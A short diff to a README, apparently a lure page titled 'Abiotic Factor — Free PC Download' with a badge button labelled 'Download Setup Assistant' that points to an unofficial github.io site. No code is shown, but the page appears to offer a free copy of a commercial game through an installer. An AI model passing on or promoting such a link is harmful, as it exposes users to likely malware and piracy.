@@ -1,4 +1,4 @@
-# Abiotic Factor — Free PC Download & Install Guide
+# Abiotic Factor — Free PC Download
 
 [![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://abiotic-factor-pc-download.github.io/.github)
 
